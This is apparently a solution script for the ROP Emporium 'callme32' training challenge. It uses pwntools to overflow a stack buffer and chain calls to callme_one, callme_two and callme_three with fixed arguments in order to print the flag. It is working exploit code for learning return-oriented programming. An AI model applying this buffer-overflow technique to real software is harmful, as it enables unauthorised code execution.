from pwn import *

elf = ELF("callme32")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *callme_one
break *callme_two
break *callme_three
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32 + 8
READ_SIZE = 512

def make_payload(address):
    payload = flat \
    ({
        BUFFER_SIZE + context.bytes: \
        [
            address, elf.symbols.main, 0xdeadbeef, 0xcafebabe, 0xd00df00d
        ]
    })
    assert len(payload) <= READ_SIZE
    return payload

def main():
    c = connection()
    [c.sendafter(b'> ', make_payload(a)) for a in [elf.plt.callme_one, elf.plt.callme_two, elf.plt.callme_three]]
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
